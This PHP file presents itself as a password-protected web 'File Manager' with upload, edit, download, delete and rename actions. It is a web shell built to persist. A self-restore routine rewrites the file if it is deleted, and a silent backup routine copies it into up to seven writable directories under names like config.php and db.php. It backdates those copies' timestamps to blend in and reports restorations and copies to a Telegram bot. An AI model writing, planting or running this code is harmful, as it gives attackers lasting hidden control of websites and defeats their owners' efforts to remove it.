<?php
error_reporting(0);
@set_time_limit(0);
@ini_set('memory_limit', '256M');

session_start();

define('FM_PASS', 'admin');
define('FM_ROOT', __DIR__);
define('FM_SELF', basename(__FILE__));
define('TG_BOT_TOKEN', '');
define('TG_CHAT_ID', '');

if (!isset($_SESSION['fm_logged'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
        if ($_POST['pass'] === FM_PASS) {
            $_SESSION['fm_logged'] = true;
            header('Location: ' . FM_SELF);
            exit;
        }
    }
    if (!isset($_SESSION['fm_logged'])) {
        show_login();
        exit;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . FM_SELF);
    exit;
}

if (empty($_SESSION['token'])) $_SESSION['token'] = bin2hex(random_bytes(16));
$token = $_SESSION['token'];
function check_token() {
    if (!isset($_POST['token']) || $_POST['token'] !== $_SESSION['token']) die('Invalid token');
}

function anti_delete_check() {
    $self = __FILE__;
    $content = @file_get_contents($self);
    if (!$content) return;
    
    $protect_key = '_prt_' . substr(md5($self), 0, 8);
    
    if (!isset($_SESSION[$protect_key])) {
        $_SESSION[$protect_key] = [
            'hash' => md5($content),
            'size' => filesize($self),
            'time' => time(),
            'content' => $content,
        ];
    }
    
    $stored = $_SESSION[$protect_key];
    
    if (!file_exists($self)) {
        @file_put_contents($self, $stored['content']);
        @chmod($self, 0644);
        
        if (TG_BOT_TOKEN && TG_CHAT_ID) {
            $host = $_SERVER['HTTP_HOST'] ?? 'unknown';
            $msg = "File restored on: " . $host;
            @file_get_contents('https://api.telegram.org/bot' . TG_BOT_TOKEN . 
                '/sendMessage?chat_id=' . TG_CHAT_ID . '&text=' . urlencode($msg));
        }
        return;
    }
    
    clearstatcache(true, $self);
    $current_size = @filesize($self);
    
    if ($current_size === false || $current_size < 100) {
        @file_put_contents($self, $stored['content']);
        @chmod($self, 0644);
    }
}

function silent_backup() {
    $self = __FILE__;
    $content = @file_get_contents($self);
    if (!$content) return;
    
    $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? dirname($self);
    $backup_key = '_bk_' . substr(md5($self), 0, 8);
    
    if (isset($_SESSION[$backup_key . '_time'])) {
        if ((time() - $_SESSION[$backup_key . '_time']) < 600) {
            return;
        }
    }
    
    $scan_dirs = [];
    
    if (is_dir($doc_root) && is_writable($doc_root)) {
        foreach (scandir($doc_root) as $item) {
            if ($item[0] === '.') continue;
            $path = $doc_root . '/' . $item;
            if (is_dir($path) && is_writable($path)) {
                $scan_dirs[] = $path;
                
                foreach (scandir($path) as $sub) {
                    if ($sub[0] === '.') continue;
                    $subpath = $path . '/' . $sub;
                    if (is_dir($subpath) && is_writable($subpath)) {
                        $scan_dirs[] = $subpath;
                    }
                }
            }
        }
    }
    
    $current = dirname($self);
    for ($i = 0; $i < 3; $i++) {
        if (is_writable($current)) $scan_dirs[] = $current;
        $current = dirname($current);
    }
    
    $scan_dirs = array_unique($scan_dirs);
    if (count($scan_dirs) < 3) return;
    
    $names = [
        'index.php', 'config.php', 'settings.php', 'common.php',
        'functions.php', 'helper.php', 'util.php', 'class.php',
        'db.php', 'database.php', 'init.php', 'bootstrap.php',
    ];
    
    if (!isset($_SESSION[$backup_key])) $_SESSION[$backup_key] = [];
    $existing = $_SESSION[$backup_key];
    
    $valid = [];
    foreach ($existing as $bk) {
        if (file_exists($bk)) $valid[] = $bk;
    }
    
    $max = 7;
    $needed = $max - count($valid);
    if ($needed <= 0) {
        $_SESSION[$backup_key] = $valid;
        return;
    }
    
    shuffle($scan_dirs);
    shuffle($names);
    
    $created = [];
    $attempts = 0;
    
    foreach ($scan_dirs as $dir) {
        if (count($created) >= $needed) break;
        if ($attempts++ > 30) break;
        
        $fname = $names[array_rand($names)];
        $target = rtrim($dir, '/') . '/' . $fname;
        
        if (file_exists($target) || realpath($target) === realpath($self)) continue;
        if (in_array($target, $valid)) continue;
        
        if (@file_put_contents($target, $content)) {
            @chmod($target, 0644);
            
            $nearby = glob(dirname($target) . '/*.php');
            if ($nearby && count($nearby) > 1) {
                $ref = $nearby[array_rand($nearby)];
                if ($ref !== $target && file_exists($ref)) {
                    $mt = @filemtime($ref);
                    if ($mt) @touch($target, $mt, $mt);
                }
            }
            
            $created[] = $target;
        }
    }
    
    $all = array_merge($valid, $created);
    $_SESSION[$backup_key] = array_values(array_unique($all));
    $_SESSION[$backup_key . '_time'] = time();
    
    if (count($created) > 0 && TG_BOT_TOKEN && TG_CHAT_ID) {
        $host = $_SERVER['HTTP_HOST'] ?? 'unknown';
        $msg = "Backup created: " . count($created) . " copies on " . $host;
        @file_get_contents('https://api.telegram.org/bot' . TG_BOT_TOKEN . 
            '/sendMessage?chat_id=' . TG_CHAT_ID . '&text=' . urlencode($msg));
    }
}

@anti_delete_check();
@silent_backup();

function get_path($p = '') {
    $root = realpath(FM_ROOT);
    if ($p) {
        $abs = realpath($root . '/' . ltrim($p, '/'));
        if ($abs && strpos($abs, $root) === 0) return $abs;
    }
    return $root;
}

function rel_path($abs) {
    return '/' . ltrim(str_replace(FM_ROOT, '', $abs), '/');
}

function format_size($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 1) . ' ' . $units[$pow];
}

$dir = isset($_GET['d']) ? $_GET['d'] : '/';
$abs_dir = get_path($dir);
$dir = rel_path($abs_dir);
$msg = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['files'])) {
    check_token();
    foreach ($_FILES['files']['name'] as $i => $name) {
        if ($_FILES['files']['error'][$i] === 0) {
            $dst = $abs_dir . '/' . basename($name);
            @move_uploaded_file($_FILES['files']['tmp_name'][$i], $dst);
        }
    }
    header('Location: ' . FM_SELF . '?d=' . urlencode($dir));
    exit;
}

if (isset($_GET['dl'])) {
    $file = get_path($_GET['dl']);
    if (is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

if (isset($_GET['del'])) {
    $target = get_path($_GET['del']);
    $self_path = realpath(__FILE__);
    
    if (realpath($target) === $self_path) {
        header('Location: ' . FM_SELF . '?d=' . urlencode($dir));
        exit;
    }
    
    if (is_file($target)) @unlink($target);
    elseif (is_dir($target)) @rmdir($target);
    header('Location: ' . FM_SELF . '?d=' . urlencode($dir));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['old'], $_POST['new'])) {
    check_token();
    $old = get_path($_POST['old']);
    $new = dirname($old) . '/' . basename($_POST['new']);
    @rename($old, $new);
    header('Location: ' . FM_SELF . '?d=' . urlencode($dir));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newfolder'])) {
    check_token();
    @mkdir($abs_dir . '/' . basename($_POST['newfolder']), 0755, true);
    header('Location: ' . FM_SELF . '?d=' . urlencode($dir));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['editpath'], $_POST['content'])) {
    check_token();
    $file = get_path($_POST['editpath']);
    if (is_file($file)) {
        @file_put_contents($file, $_POST['content']);
        $msg = 'File saved';
    }
}

$edit_file = isset($_GET['edit']) ? get_path($_GET['edit']) : null;
$edit_content = $edit_file && is_file($edit_file) ? file_get_contents($edit_file) : '';

$items = [];
if (is_dir($abs_dir)) {
    foreach (scandir($abs_dir) as $item) {
        if ($item === '.') continue;
        $path = $abs_dir . '/' . $item;
        $items[] = [
            'name' => $item,
            'path' => rel_path($path),
            'is_dir' => is_dir($path),
            'size' => is_file($path) ? format_size(filesize($path)) : '-',
            'perms' => substr(sprintf('%o', fileperms($path)), -4),
            'modified' => date('Y-m-d H:i', filemtime($path)),
        ];
    }
}
usort($items, function($a, $b) {
    if ($a['is_dir'] != $b['is_dir']) return $b['is_dir'] - $a['is_dir'];
    return strcmp($a['name'], $b['name']);
});

function show_login() { ?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font:14px -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;background:whitesmoke;display:flex;align-items:center;justify-content:center;min-height:100vh}
.login-box{background:white;padding:40px;border-radius:4px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:320px}
.login-box h2{margin-bottom:30px;text-align:center}
.login-box input{width:100%;padding:12px;border:1px solid silver;border-radius:4px;margin-bottom:15px;font-size:14px}
.login-box button{width:100%;padding:12px;background:gray;color:white;border:none;border-radius:4px;cursor:pointer;font-size:14px}
.login-box button:hover{background:dimgray}
</style>
</head>
<body>
<div class="login-box">
<h2>File Manager</h2>
<form method="POST">
<input type="password" name="pass" placeholder="Password" autofocus required>
<button type="submit">Login</button>
</form>
</div>
</body>
</html>
<?php exit; }

if ($edit_file) { ?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Edit File</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font:14px -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;background:whitesmoke}
.header{background:white;border-bottom:1px solid gainsboro;padding:15px 20px;display:flex;justify-content:space-between;align-items:center}
.header h1{font-size:18px}
.header a{text-decoration:none}
.editor{padding:20px}
.editor textarea{width:100%;height:calc(100vh - 150px);padding:15px;border:1px solid silver;border-radius:4px;font-family:Monaco,Consolas,monospace;font-size:13px}
.actions{padding:0 20px 20px;display:flex;gap:10px}
.actions button,.actions a{padding:10px 20px;border-radius:4px;text-decoration:none;font-size:14px;cursor:pointer;border:none;color:white}
.btn-save{background:gray}
.btn-save:hover{background:dimgray}
.btn-cancel{background:darkgray;display:inline-block}
.btn-cancel:hover{background:gray}
</style>
</head>
<body>
<div class="header">
<h1><?=htmlspecialchars(basename($edit_file))?></h1>
<a href="?d=<?=urlencode($dir)?>">Back</a>
</div>
<form method="POST">
<input type="hidden" name="token" value="<?=$token?>">
<input type="hidden" name="editpath" value="<?=htmlspecialchars(rel_path($edit_file))?>">
<div class="editor">
<textarea name="content"><?=htmlspecialchars($edit_content)?></textarea>
</div>
<div class="actions">
<button type="submit" class="btn-save">Save</button>
<a href="?d=<?=urlencode($dir)?>" class="btn-cancel">Cancel</a>
</div>
</form>
</body>
</html>
<?php exit; }
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font:14px -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;background:whitesmoke}
.header{background:white;border-bottom:1px solid gainsboro;padding:15px 20px;display:flex;justify-content:space-between;align-items:center}
.header h1{font-size:18px}
.header a{text-decoration:none;margin-left:20px}
.path{background:white;border-bottom:1px solid gainsboro;padding:10px 20px;font-size:13px}
.path a{text-decoration:none;margin-right:5px}
.toolbar{background:white;border-bottom:1px solid gainsboro;padding:10px 20px;display:flex;gap:10px}
.btn{padding:8px 15px;background:gray;color:white;border:none;border-radius:4px;cursor:pointer;font-size:13px;text-decoration:none;display:inline-block}
.btn:hover{background:dimgray}
.btn-sec{background:darkgray}
.btn-sec:hover{background:gray}
.content{padding:20px}
.table-wrap{background:white;border-radius:4px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.1)}
table{width:100%;border-collapse:collapse}
th{background:whitesmoke;padding:12px 15px;text-align:left;font-weight:600;font-size:12px;border-bottom:1px solid gainsboro}
td{padding:10px 15px;border-bottom:1px solid gainsboro;font-size:13px}
tr:hover{background:white}
.name{text-decoration:none;display:flex;align-items:center;gap:8px}
.name:hover{text-decoration:underline}
.icon{width:16px;height:16px;display:inline-block}
.actions a{text-decoration:none;margin:0 5px;font-size:12px}
.actions a:hover{text-decoration:underline}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);align-items:center;justify-content:center}
.modal.show{display:flex}
.modal-content{background:white;padding:20px;border-radius:4px;width:400px;max-width:90%}
.modal-content h3{margin-bottom:15px;font-size:16px}
.modal-content input{width:100%;padding:10px;border:1px solid silver;border-radius:4px;margin-bottom:15px}
.modal-actions{display:flex;gap:10px;justify-content:flex-end}
input[type=file]{padding:8px}
.msg{padding:10px;background:lightgray;border-radius:4px;margin-bottom:20px}
</style>
</head>
<body>

<div class="header">
<h1>File Manager</h1>
<div>
<a href="?logout=1">Logout</a>
</div>
</div>

<div class="path">
<?php
$parts = explode('/', trim($dir, '/'));
$path = '';
echo '<a href="?d=/">Root</a>';
foreach ($parts as $p) {
    if (!$p) continue;
    $path .= '/' . $p;
    echo ' / <a href="?d=' . urlencode($path) . '">' . htmlspecialchars($p) . '</a>';
}
?>
</div>

<div class="toolbar">
<button class="btn" onclick="document.getElementById('upload-modal').classList.add('show')">Upload</button>
<button class="btn btn-sec" onclick="document.getElementById('mkdir-modal').classList.add('show')">New Folder</button>
</div>

<?php if($msg):?>
<div class="content"><div class="msg"><?=htmlspecialchars($msg)?></div></div>
<?php endif?>

<div class="content">
<div class="table-wrap">
<table>
<thead>
<tr>
<th>Name</th>
<th>Size</th>
<th>Modified</th>
<th>Permissions</th>
<th>Actions</th>
</tr>
</thead>
<tbody>
<?php if ($dir !== '/'):?>
<tr>
<td colspan="5"><a href="?d=<?=urlencode(dirname($dir))?>" class="name"><span class="icon">📁</span>..</a></td>
</tr>
<?php endif?>
<?php foreach($items as $item):?>
<tr>
<td>
<?php if($item['is_dir']):?>
<a href="?d=<?=urlencode($item['path'])?>" class="name"><span class="icon">📁</span><?=htmlspecialchars($item['name'])?></a>
<?php else:?>
<span class="name"><span class="icon">📄</span><?=htmlspecialchars($item['name'])?></span>
<?php endif?>
</td>
<td><?=htmlspecialchars($item['size'])?></td>
<td><?=htmlspecialchars($item['modified'])?></td>
<td><?=htmlspecialchars($item['perms'])?></td>
<td class="actions">
<?php if(!$item['is_dir']):?>
<a href="?edit=<?=urlencode($item['path'])?>">Edit</a>
<a href="?dl=<?=urlencode($item['path'])?>">Download</a>
<?php endif?>
<a href="?del=<?=urlencode($item['path'])?>&d=<?=urlencode($dir)?>" onclick="return confirm('Delete?')">Delete</a>
<a href="aaa" onclick="rename('<?=htmlspecialchars(addslashes($item['path']))?>','<?=htmlspecialchars(addslashes($item['name']))?>');return false">Rename</a>
</td>
</tr>
<?php endforeach?>
</tbody>
</table>
</div>
</div>

<div id="upload-modal" class="modal">
<div class="modal-content">
<h3>Upload Files</h3>
<form method="POST" enctype="multipart/form-data">
<input type="hidden" name="token" value="<?=$token?>">
<input type="file" name="files[]" multiple>
<div class="modal-actions">
<button type="submit" class="btn">Upload</button>
<button type="button" class="btn btn-sec" onclick="this.closest('.modal').classList.remove('show')">Cancel</button>
</div>
</form>
</div>
</div>

<div id="mkdir-modal" class="modal">
<div class="modal-content">
<h3>Create Folder</h3>
<form method="POST">
<input type="hidden" name="token" value="<?=$token?>">
<input type="text" name="newfolder" placeholder="Folder name" required>
<div class="modal-actions">
<button type="submit" class="btn">Create</button>
<button type="button" class="btn btn-sec" onclick="this.closest('.modal').classList.remove('show')">Cancel</button>
</div>
</form>
</div>
</div>

<div id="rename-modal" class="modal">
<div class="modal-content">
<h3>Rename</h3>
<form method="POST">
<input type="hidden" name="token" value="<?=$token?>">
<input type="hidden" name="old" id="rename-old">
<input type="text" name="new" id="rename-new" required>
<div class="modal-actions">
<button type="submit" class="btn">Rename</button>
<button type="button" class="btn btn-sec" onclick="this.closest('.modal').classList.remove('show')">Cancel</button>
</div>
</form>
</div>
</div>

<script>
function rename(path,name){
document.getElementById('rename-old').value=path;
document.getElementById('rename-new').value=name;
document.getElementById('rename-modal').classList.add('show');
}
document.querySelectorAll('.modal').forEach(m=>{
m.addEventListener('click',e=>{
if(e.target===m)m.classList.remove('show');
});
});
</script>
</body>
</html>
